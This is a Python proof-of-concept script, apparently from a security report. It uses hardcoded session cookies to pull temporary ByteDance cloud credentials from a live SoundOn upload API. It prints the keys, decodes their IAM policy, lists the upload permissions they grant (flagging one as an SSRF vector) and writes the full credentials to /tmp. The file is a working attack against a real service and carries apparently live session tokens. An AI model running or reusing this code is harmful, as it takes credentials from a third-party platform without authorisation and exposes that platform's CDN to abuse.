#!/usr/bin/env python3
"""
SoundOn STS Credential Leak — Decoder & Impact Analyzer
Decodes the ByteDance STS SessionToken to reveal the full IAM policy.

Usage: python3 decode_sts_policy.py [--cookie "sessionid=...; passport_csrf_token=..."]
"""

import json, base64, urllib.request, sys, os

COOKIE = os.environ.get("SOUNDON_COOKIE", 
    "passport_csrf_token=629601b94a11de8967a154a96148770b; "
    "sessionid=783d6d3293b1b4bd0dfa5efca28e6b05; "
    "passport_auth_status=ca500d43638316577f32e783916c5f89%2Ce89e680b8ffc7ff852c009d2313cfd68")

def get_sts_token():
    req = urllib.request.Request(
        "https://www.soundon.global/api/upload/vcloud/ststoken",
        headers={"Cookie": COOKIE, "Accept": "application/json"}
    )
    resp = urllib.request.urlopen(req, timeout=10)
    return json.loads(resp.read())

def decode_session_token(session_token):
    inner = session_token[4:]  # strip STS2 prefix
    padded = inner + '=' * (4 - len(inner) % 4) if len(inner) % 4 else inner
    raw = base64.b64decode(padded)
    outer = json.loads(raw.decode('utf-8'))
    policy_str = outer.get("PolicyString", "")
    return json.loads(policy_str)

def main():
    print("=" * 60)
    print(" SoundOn STS Credential Leak — PoC")
    print("=" * 60)
    print()
    
    print("[*] Retrieving STS credentials from SoundOn API...")
    try:
        data = get_sts_token()
    except Exception as e:
        print(f"[!] Failed to get credentials: {e}")
        print("[!] Update the COOKIE variable with your session cookie")
        sys.exit(1)
    
    token = data["token"]
    print(f"[+] Credentials obtained successfully")
    print(f"    AccessKeyId:     {token['AccessKeyId']}")
    print(f"    SecretAccessKey: {token['SecretAccessKey'][:40]}...")
    print(f"    Expires:         {token['ExpiredTime']}")
    print(f"    SessionToken:    {token['SessionToken'][:60]}...")
    print()
    
    print("[*] Decoding IAM policy from SessionToken...")
    policy = decode_session_token(token["SessionToken"])
    
    print("[+] Decoded policy:")
    print()
    for stmt in policy.get("Statement", []):
        print(f"    Effect: {stmt.get('Effect')}")
        print(f"    Actions:")
        for action in stmt.get("Action", []):
            service, op = action.split(":", 1)
            print(f"      - {service}:{op}")
        print(f"    Resources: {stmt.get('Resource', [])}")
        cond = stmt.get("Condition", "")
        if cond:
            c = json.loads(cond)
            print(f"    Condition: {json.dumps(c, indent=6)}")
    
    print()
    print("=" * 60)
    print(" IMPACT SUMMARY")
    print("=" * 60)
    print()
    print("  IMAGEX (Image CDN):")
    print("    - ApplyImageUpload       → Request upload URL for images")
    print("    - CommitImageUpload      → Publish uploaded image to CDN")
    print("    - ApplyUploadImageFile   → Upload image file directly")
    print("    - CommitUploadImageFile  → Finalize image file upload")
    print()
    print("  VOD (Video CDN):")
    print("    - ApplyUpload            → Request upload URL for videos")
    print("    - CommitUpload           → Publish uploaded video to CDN")
    print("    - ApplyUploadInner       → Internal upload (less restricted?)")
    print("    - CommitUploadInner      → Finalize internal upload")
    print("    - GetUploadCandidates     → Enumerate upload infrastructure")
    print("    - UploadVideoByUrl        → Upload from arbitrary URL (SSRF vector)")
    print()
    print("  RESOURCES: * (ALL)")
    print("  CONDITION: PSM = ies.musician.avenue_api (SoundOn product scope)")
    print()
    print("  Token expires in 1 hour. Refreshable with another API call.")
    print("  No rate limiting observed.")
    print()
    
    # Save to file for manual testing
    with open("/tmp/soundon_sts_creds.json", "w") as f:
        json.dump(token, f, indent=2)
    print("[*] Full credentials saved to /tmp/soundon_sts_creds.json")

if __name__ == "__main__":
    main()
